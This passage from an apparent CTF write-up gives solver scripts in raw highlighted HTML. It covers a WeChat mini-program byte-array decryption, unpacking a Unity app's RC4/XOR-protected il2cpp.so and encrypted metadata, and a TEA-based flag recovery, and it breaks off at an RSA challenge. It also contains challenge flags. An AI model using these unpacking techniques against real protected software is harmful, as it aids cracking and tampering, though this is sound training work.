+</span></span><span class=line><span class=cl>    <span class=nx>JSON</span><span class=p>.</span><span class=nx>stringify</span><span class=p>(</span><span class=nx>t</span><span class=p>)</span> <span class=o>===</span> <span class=nx>JSON</span><span class=p>.</span><span class=nx>stringify</span><span class=p>([</span><span class=mi>1</span><span class=p>,</span><span class=mi>33</span><span class=p>,</span><span class=mi>194</span><span class=p>,</span><span class=mi>133</span><span class=p>,</span><span class=mi>195</span><span class=p>,</span><span class=mi>102</span><span class=p>,</span><span class=mi>232</span><span class=p>,</span><span class=mi>104</span><span class=p>,</span><span class=mi>200</span><span class=p>,</span><span class=mi>14</span><span class=p>,</span><span class=mi>8</span><span class=p>,</span><span class=mi>163</span><span class=p>,</span><span class=mi>131</span><span class=p>,</span><span class=mi>71</span><span class=p>,</span><span class=mi>68</span><span class=p>,</span><span class=mi>97</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>76</span><span class=p>,</span><span class=mi>72</span><span class=p>,</span><span class=mi>171</span><span class=p>,</span><span class=mi>74</span><span class=p>,</span><span class=mi>106</span><span class=p>,</span><span class=mi>225</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>65</span><span class=p>])</span>
+</span></span><span class=line><span class=cl>        <span class=o>?</span> <span class=nx>wx</span><span class=p>.</span><span class=nx>showToast</span><span class=p>({</span> <span class=nx>title</span><span class=o>:</span> <span class=s2>&#34;Right&#34;</span><span class=p>,</span> <span class=nx>icon</span><span class=o>:</span> <span class=s2>&#34;success&#34;</span><span class=p>,</span> <span class=nx>duration</span><span class=o>:</span> <span class=mf>2e3</span> <span class=p>})</span>
+</span></span><span class=line><span class=cl>        <span class=o>:</span> <span class=nx>wx</span><span class=p>.</span><span class=nx>showToast</span><span class=p>({</span> <span class=nx>title</span><span class=o>:</span> <span class=s2>&#34;Wrong&#34;</span><span class=p>,</span> <span class=nx>icon</span><span class=o>:</span> <span class=s2>&#34;error&#34;</span><span class=p>,</span> <span class=nx>duration</span><span class=o>:</span> <span class=mf>2e3</span> <span class=p>})</span>
+</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nx>wx</span><span class=p>.</span><span class=nx>showToast</span><span class=p>({</span> <span class=nx>title</span><span class=o>:</span> <span class=s2>&#34;请输入内容&#34;</span><span class=p>,</span> <span class=nx>icon</span><span class=o>:</span> <span class=s2>&#34;none&#34;</span><span class=p>,</span> <span class=nx>duration</span><span class=o>:</span> <span class=mf>2e3</span> <span class=p>})</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>直接求逆即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl> <span class=k>def</span> <span class=nf>decrypt</span><span class=p>(</span><span class=n>cipher</span><span class=p>,</span> <span class=n>key</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>key_bytes</span> <span class=o>=</span> <span class=p>[</span><span class=nb>ord</span><span class=p>(</span><span class=n>ch</span><span class=p>)</span> <span class=k>for</span> <span class=n>ch</span> <span class=ow>in</span> <span class=n>key</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>key_bytes</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>c</span> <span class=o>=</span> <span class=nb>sum</span><span class=p>(</span><span class=n>key_bytes</span><span class=p>)</span> <span class=o>%</span> <span class=mi>8</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>out_bytes</span> <span class=o>=</span> <span class=p>[]</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span><span class=p>,</span> <span class=n>cb</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>cipher</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>c</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>u</span> <span class=o>=</span> <span class=n>cb</span> <span class=o>&amp;</span> <span class=mh>0xFF</span>
+</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>u</span> <span class=o>=</span> <span class=p>((</span><span class=n>cb</span> <span class=o>&gt;&gt;</span> <span class=n>c</span><span class=p>)</span> <span class=o>|</span> <span class=p>((</span><span class=n>cb</span> <span class=o>&lt;&lt;</span> <span class=p>(</span><span class=mi>8</span> <span class=o>-</span> <span class=n>c</span><span class=p>))</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>))</span> <span class=o>&amp;</span> <span class=mh>0xFF</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>kb</span> <span class=o>=</span> <span class=n>key_bytes</span><span class=p>[</span><span class=n>i</span> <span class=o>%</span> <span class=n>s</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>        <span class=n>p</span> <span class=o>=</span> <span class=n>u</span> <span class=o>^</span> <span class=n>kb</span>
+</span></span><span class=line><span class=cl>        <span class=n>out_bytes</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>p</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>b</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>out_bytes</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>s</span> <span class=o>=</span> <span class=n>b</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>s</span> <span class=o>=</span> <span class=n>b</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>,</span> <span class=n>errors</span><span class=o>=</span><span class=s1>&#39;replace&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>b</span><span class=p>,</span> <span class=n>s</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>cipher</span> <span class=o>=</span> <span class=p>[</span><span class=mi>1</span><span class=p>,</span><span class=mi>33</span><span class=p>,</span><span class=mi>194</span><span class=p>,</span><span class=mi>133</span><span class=p>,</span><span class=mi>195</span><span class=p>,</span><span class=mi>102</span><span class=p>,</span><span class=mi>232</span><span class=p>,</span><span class=mi>104</span><span class=p>,</span><span class=mi>200</span><span class=p>,</span><span class=mi>14</span><span class=p>,</span><span class=mi>8</span><span class=p>,</span><span class=mi>163</span><span class=p>,</span><span class=mi>131</span><span class=p>,</span><span class=mi>71</span><span class=p>,</span><span class=mi>68</span><span class=p>,</span><span class=mi>97</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>76</span><span class=p>,</span><span class=mi>72</span><span class=p>,</span><span class=mi>171</span><span class=p>,</span><span class=mi>74</span><span class=p>,</span><span class=mi>106</span><span class=p>,</span><span class=mi>225</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>65</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=s2>&#34;newKey2025!&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>raw</span><span class=p>,</span> <span class=n>text</span> <span class=o>=</span> <span class=n>decrypt</span><span class=p>(</span><span class=n>cipher</span><span class=p>,</span> <span class=n>key</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>text</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>得到flag：flag{JustEasyMiniProgram}</p><h2 id=just>Just</h2><p>il2cpp的加固，思考如何解密il2cpp.so</p><p><img src=https://su-team.cn/img/2025-QWNT/28.png alt=img></p><p>UnityPlayerActivity中载入了just.so，后续不再有任何JNI调用，说明利用了构造函数或者Jni_onload</p><p>Just.so Hook了dlopen解密il2cpp.so</p><p><img src=https://su-team.cn/img/2025-QWNT/29.png alt=img></p><p>可以看到解密逻辑是RC4+^0x33</p><p>密钥在上文中是nihaounity</p><p><img src=https://su-team.cn/img/2025-QWNT/30.png alt=img></p><p>解密到so文件，直接尝试il2cppdumper是失败的，发现metadata也被加密了，metadata是在il2cpp.so中进行加密的</p><p><img src=https://su-team.cn/img/2025-QWNT/31.png alt=img></p><p>看到加密逻辑，这里直接解密</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span><span class=o>,</span> <span class=nn>struct</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pathlib</span> <span class=kn>import</span> <span class=n>Path</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decrypt</span><span class=p>(</span><span class=n>inp</span><span class=p>,</span> <span class=n>outp</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>d</span> <span class=o>=</span> <span class=n>Path</span><span class=p>(</span><span class=n>inp</span><span class=p>)</span><span class=o>.</span><span class=n>read_bytes</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>kl</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack_from</span><span class=p>(</span><span class=s2>&#34;&lt;I&#34;</span><span class=p>,</span> <span class=n>d</span><span class=p>,</span> <span class=mi>1024</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span> <span class=o>&amp;</span> <span class=mh>0xffff</span>
+</span></span><span class=line><span class=cl>    <span class=n>m</span> <span class=o>=</span> <span class=p>[</span><span class=n>struct</span><span class=o>.</span><span class=n>unpack_from</span><span class=p>(</span><span class=s2>&#34;&lt;I&#34;</span><span class=p>,</span> <span class=n>d</span><span class=p>,</span> <span class=mi>1028</span> <span class=o>+</span> <span class=mi>4</span><span class=o>*</span><span class=n>i</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>kl</span><span class=p>)]</span>
+</span></span><span class=line><span class=cl>    <span class=n>e</span> <span class=o>=</span> <span class=mi>1024</span> <span class=o>+</span> <span class=mi>4</span><span class=o>*</span><span class=p>(</span><span class=n>kl</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>out</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>(</span><span class=n>d</span><span class=p>[:</span><span class=mi>1024</span><span class=p>])</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>d</span><span class=p>)</span><span class=o>-</span><span class=n>e</span> <span class=o>-</span> <span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>d</span><span class=p>)</span><span class=o>-</span><span class=n>e</span><span class=p>)</span><span class=o>%</span><span class=mi>4</span><span class=p>,</span> <span class=mi>4</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>idx</span> <span class=o>=</span> <span class=p>(</span><span class=n>i</span> <span class=o>+</span> <span class=n>i</span><span class=o>//</span><span class=n>kl</span><span class=p>)</span> <span class=o>%</span> <span class=n>kl</span>
+</span></span><span class=line><span class=cl>        <span class=n>w</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack_from</span><span class=p>(</span><span class=s2>&#34;&lt;I&#34;</span><span class=p>,</span> <span class=n>d</span><span class=p>,</span> <span class=n>e</span><span class=o>+</span><span class=n>i</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span> <span class=o>^</span> <span class=n>m</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>        <span class=n>out</span> <span class=o>+=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s2>&#34;&lt;I&#34;</span><span class=p>,</span> <span class=n>w</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>Path</span><span class=p>(</span><span class=n>outp</span><span class=p>)</span><span class=o>.</span><span class=n>write_bytes</span><span class=p>(</span><span class=n>out</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>decrypt</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>])</span>
+</span></span></code></pre></td></tr></table></div></div><p>接下来il2cppdumper直接恢复符号了</p><p><img src=https://su-team.cn/img/2025-QWNT/32.png alt=img></p><p><img src=https://su-team.cn/img/2025-QWNT/33.png alt=img></p><p>TEA轮子没有任何魔改，就是tea加密自身之后再进行异或，引入流密码特性</p><p><img src=https://su-team.cn/img/2025-QWNT/34.png alt=img></p><p>根据PrivateImplementationDetails的特性，构造函数的这个内容是通过dump.cs找偏移在global-metadata中取值</p><p><img src=https://su-team.cn/img/2025-QWNT/35.png alt=img></p><p>根据偏移索引地址</p><p><img src=https://su-team.cn/img/2025-QWNT/36.png alt=img></p><p>即可找到密文密钥</p><p>根据tea特性4个uint为密钥，40bytes自然是密文</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>struct</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>MASK</span> <span class=o>=</span> <span class=mh>0xFFFFFFFF</span>
+</span></span><span class=line><span class=cl><span class=n>KEYS</span> <span class=o>=</span> <span class=p>[</span><span class=mh>0x12345678</span><span class=p>,</span> <span class=mh>0x09101112</span><span class=p>,</span> <span class=mh>0x13141516</span><span class=p>,</span> <span class=mh>0x15161718</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>([</span>
+</span></span><span class=line><span class=cl><span class=mh>0xAF</span><span class=p>,</span><span class=mh>0x58</span><span class=p>,</span><span class=mh>0x64</span><span class=p>,</span><span class=mh>0x40</span><span class=p>,</span><span class=mh>0x9D</span><span class=p>,</span><span class=mh>0xB9</span><span class=p>,</span><span class=mh>0x21</span><span class=p>,</span><span class=mh>0x67</span><span class=p>,</span><span class=mh>0xAE</span><span class=p>,</span><span class=mh>0xB5</span><span class=p>,</span><span class=mh>0x29</span><span class=p>,</span><span class=mh>0x04</span><span class=p>,</span><span class=mh>0x9E</span><span class=p>,</span><span class=mh>0x86</span><span class=p>,</span><span class=mh>0xC5</span><span class=p>,</span><span class=mh>0x43</span><span class=p>,</span>
+</span></span><span class=line><span class=cl><span class=mh>0x23</span><span class=p>,</span><span class=mh>0x0F</span><span class=p>,</span><span class=mh>0xBF</span><span class=p>,</span><span class=mh>0xA6</span><span class=p>,</span><span class=mh>0xB2</span><span class=p>,</span><span class=mh>0xAE</span><span class=p>,</span><span class=mh>0x4A</span><span class=p>,</span><span class=mh>0xB5</span><span class=p>,</span><span class=mh>0xC5</span><span class=p>,</span><span class=mh>0x69</span><span class=p>,</span><span class=mh>0xB7</span><span class=p>,</span><span class=mh>0xA8</span><span class=p>,</span><span class=mh>0x03</span><span class=p>,</span><span class=mh>0xD1</span><span class=p>,</span><span class=mh>0xAE</span><span class=p>,</span><span class=mh>0xCF</span><span class=p>,</span>
+</span></span><span class=line><span class=cl><span class=mh>0xC6</span><span class=p>,</span><span class=mh>0x2C</span><span class=p>,</span><span class=mh>0x5B</span><span class=p>,</span><span class=mh>0x7F</span><span class=p>,</span><span class=mh>0xA2</span><span class=p>,</span><span class=mh>0x86</span><span class=p>,</span><span class=mh>0x1E</span><span class=p>,</span><span class=mh>0x1A</span>
+</span></span><span class=line><span class=cl><span class=p>])</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get32</span><span class=p>(</span><span class=n>b</span><span class=p>,</span> <span class=n>off</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack_from</span><span class=p>(</span><span class=s2>&#34;&lt;I&#34;</span><span class=p>,</span> <span class=n>b</span><span class=p>,</span> <span class=n>off</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>set32</span><span class=p>(</span><span class=n>b</span><span class=p>,</span> <span class=n>off</span><span class=p>,</span> <span class=n>v</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>struct</span><span class=o>.</span><span class=n>pack_into</span><span class=p>(</span><span class=s2>&#34;&lt;I&#34;</span><span class=p>,</span> <span class=n>b</span><span class=p>,</span> <span class=n>off</span><span class=p>,</span> <span class=n>v</span> <span class=o>&amp;</span> <span class=n>MASK</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>tea_like</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>k</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>v0</span><span class=p>,</span> <span class=n>v1</span> <span class=o>=</span> <span class=n>x</span>
+</span></span><span class=line><span class=cl>    <span class=n>delta</span> <span class=o>=</span> <span class=mh>0x61C88647</span>
+</span></span><span class=line><span class=cl>    <span class=n>sumv</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>16</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>sumv</span> <span class=o>=</span> <span class=p>(</span><span class=n>sumv</span> <span class=o>-</span> <span class=n>delta</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>MASK</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>16</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>sumv</span> <span class=o>=</span> <span class=p>(</span><span class=n>sumv</span> <span class=o>+</span> <span class=n>delta</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>MASK</span>
+</span></span><span class=line><span class=cl>        <span class=n>t1</span> <span class=o>=</span> <span class=p>(((</span><span class=n>v0</span> <span class=o>&lt;&lt;</span> <span class=mi>4</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>MASK</span><span class=p>)</span> <span class=o>+</span> <span class=n>k</span><span class=p>[</span><span class=mi>2</span><span class=p>])</span> <span class=o>&amp;</span> <span class=n>MASK</span>
+</span></span><span class=line><span class=cl>        <span class=n>t2</span> <span class=o>=</span> <span class=p>(</span><span class=n>v0</span> <span class=o>+</span> <span class=n>sumv</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>MASK</span>
+</span></span><span class=line><span class=cl>        <span class=n>t3</span> <span class=o>=</span> <span class=p>(((</span><span class=n>v0</span> <span class=o>&gt;&gt;</span> <span class=mi>5</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>MASK</span><span class=p>)</span> <span class=o>+</span> <span class=n>k</span><span class=p>[</span><span class=mi>3</span><span class=p>])</span> <span class=o>&amp;</span> <span class=n>MASK</span>
+</span></span><span class=line><span class=cl>        <span class=n>v1</span> <span class=o>=</span> <span class=p>(</span><span class=n>v1</span> <span class=o>-</span> <span class=p>(</span><span class=n>t1</span> <span class=o>^</span> <span class=n>t2</span> <span class=o>^</span> <span class=n>t3</span><span class=p>))</span> <span class=o>&amp;</span> <span class=n>MASK</span>
+</span></span><span class=line><span class=cl>        <span class=n>t1</span> <span class=o>=</span> <span class=p>(((</span><span class=n>v1</span> <span class=o>&lt;&lt;</span> <span class=mi>4</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>MASK</span><span class=p>)</span> <span class=o>+</span> <span class=n>k</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span> <span class=o>&amp;</span> <span class=n>MASK</span>
+</span></span><span class=line><span class=cl>        <span class=n>t2</span> <span class=o>=</span> <span class=p>(</span><span class=n>v1</span> <span class=o>+</span> <span class=n>sumv</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>MASK</span>
+</span></span><span class=line><span class=cl>        <span class=n>t3</span> <span class=o>=</span> <span class=p>(((</span><span class=n>v1</span> <span class=o>&gt;&gt;</span> <span class=mi>5</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>MASK</span><span class=p>)</span> <span class=o>+</span> <span class=n>k</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span> <span class=o>&amp;</span> <span class=n>MASK</span>
+</span></span><span class=line><span class=cl>        <span class=n>v0</span> <span class=o>=</span> <span class=p>(</span><span class=n>v0</span> <span class=o>-</span> <span class=p>(</span><span class=n>t1</span> <span class=o>^</span> <span class=n>t2</span> <span class=o>^</span> <span class=n>t3</span><span class=p>))</span> <span class=o>&amp;</span> <span class=n>MASK</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>v0</span><span class=p>,</span> <span class=n>v1</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>p1</span> <span class=o>=</span> <span class=n>get32</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>p2</span> <span class=o>=</span> <span class=n>get32</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mi>4</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=o>-</span><span class=mi>2</span><span class=p>):</span>  <span class=c1># 8,6,4,2</span>
+</span></span><span class=line><span class=cl>    <span class=n>off</span> <span class=o>=</span> <span class=n>i</span> <span class=o>*</span> <span class=mi>4</span>
+</span></span><span class=line><span class=cl>    <span class=n>v3</span> <span class=o>=</span> <span class=n>get32</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=n>off</span><span class=p>)</span> <span class=o>^</span> <span class=n>p1</span>
+</span></span><span class=line><span class=cl>    <span class=n>v4</span> <span class=o>=</span> <span class=n>get32</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=n>off</span> <span class=o>+</span> <span class=mi>4</span><span class=p>)</span> <span class=o>^</span> <span class=n>p2</span>
+</span></span><span class=line><span class=cl>    <span class=n>set32</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=n>off</span><span class=p>,</span> <span class=n>v3</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>set32</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=n>off</span> <span class=o>+</span> <span class=mi>4</span><span class=p>,</span> <span class=n>v4</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>p1</span><span class=p>,</span> <span class=n>p2</span> <span class=o>=</span> <span class=n>tea_like</span><span class=p>((</span><span class=n>p1</span><span class=p>,</span> <span class=n>p2</span><span class=p>),</span> <span class=n>KEYS</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>set32</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>p1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>set32</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=n>p2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>p1</span><span class=p>,</span> <span class=n>p2</span> <span class=o>=</span> <span class=n>tea_like</span><span class=p>((</span><span class=n>p1</span><span class=p>,</span> <span class=n>p2</span><span class=p>),</span> <span class=n>KEYS</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>set32</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>p1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>set32</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=n>p2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;flag:&#34;</span><span class=p>,</span> <span class=n>buf</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;ascii&#39;</span><span class=p>))</span>
+</span></span></code></pre></td></tr></table></div></div><h1 id=crypto>Crypto</h1><h2 id=unsafe-parameters>Unsafe Parameters</h2><p>多因子共私钥攻击，按照这篇论文去打</p><p><a href=http://ijeie.jalaxy.com.tw/contents/ijeie-v7-n2/ijeie-2017-v7-n2-p79-87.pdf>http://ijeie.jalaxy.com.tw/contents/ijeie-v7-n2/ijeie-2017-v7-n2-p79-87.pdf</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
